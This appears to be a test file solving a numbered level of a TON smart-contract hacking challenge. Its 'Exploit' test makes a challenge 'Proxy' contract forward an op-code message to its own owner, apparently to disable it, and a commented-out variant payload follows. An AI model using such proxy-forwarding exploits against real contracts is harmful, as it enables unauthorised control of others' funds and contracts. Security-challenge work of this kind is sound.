import {
    Blockchain,
    RemoteBlockchainStorage,
    SandboxContract,
    TreasuryContract,
    wrapTonClient4ForRemote,
} from '@ton/sandbox';
import { Address, beginCell, Cell, toNano } from '@ton/core';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';
import { TonClient4 } from '@ton/ton';
import { Proxy } from '../wrappers/Proxy';

// npx blueprint test 19. Proxy.spec.ts
describe('Proxy', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('Proxy');
    });

    let blockchain: Blockchain;
    let deployer: SandboxContract<TreasuryContract>;
    let proxy: SandboxContract<Proxy>;

    const level_addr = Address.parse('EQCqNt7ZSCtv6wVYqL76NYzV5rFwUV0kCfJun3VFFIon-fLy');
    beforeEach(async () => {
        blockchain = await Blockchain.create({
            storage: new RemoteBlockchainStorage(
                wrapTonClient4ForRemote(
                    new TonClient4({
                        endpoint: 'https://sandbox-v4.tonhubapi.com',
                    }),
                ),
            ),
        });
        deployer = await blockchain.treasury('deployer');

        proxy = blockchain.openContract(Proxy.createFromAddress(level_addr));
    });

    it('Exploit', async () => {
        console.log(await proxy.getOwner());
        console.log(await proxy.getEnabled());

        const msgBody = beginCell().storeUint(0x01, 32).endCell();

        await proxy.sendSend(deployer.getSender(), {
            value: toNano('0.1'),
            target: await proxy.getOwner(),
            msgBody: msgBody,
        });

        // await contract.send(
        //     player,
        //     beginCell()
        //         .storeUint(0, 32)
        //         .storeAddress(Address.parse('EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c'))
        //         .storeRef(beginCell().storeUint(0x01, 32).endCell())
        //         .endCell(),
        //     toNano('0.1'),
        // );

        // expect(await proxy.getEnabled()).toEqual(false);
    });
});
